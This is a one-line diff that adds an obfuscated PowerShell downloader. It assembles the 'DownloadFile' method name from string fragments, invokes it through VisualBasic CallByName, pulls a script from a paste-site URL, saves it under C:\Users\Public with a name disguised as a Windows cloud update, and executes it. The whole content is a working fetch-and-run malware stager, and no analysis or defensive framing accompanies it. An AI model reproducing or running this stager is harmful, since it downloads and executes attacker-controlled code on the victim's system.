@@ -1,0 +1,1 @@
+Add-Type -AssemblyName Microsoft.VisualBasic;[System.Net.WebClient]$WEB=New-Object System.Net.WebClient;[String]$DownloadFile='D'+'o'+'w'+'nlo'+'ad'+'Fi'+'l'+'e';[Microsoft.VisualBasic.Interaction]::CallByName($WEB,$DownloadFile,1,@('https://notepadonline.org/raw/bS1cA6USmm','C:\Users\Public\WindowsCloudUpdate.PS1'));PowerShell -File C:\Users\Public\WindowsCloudUpdate.PS1
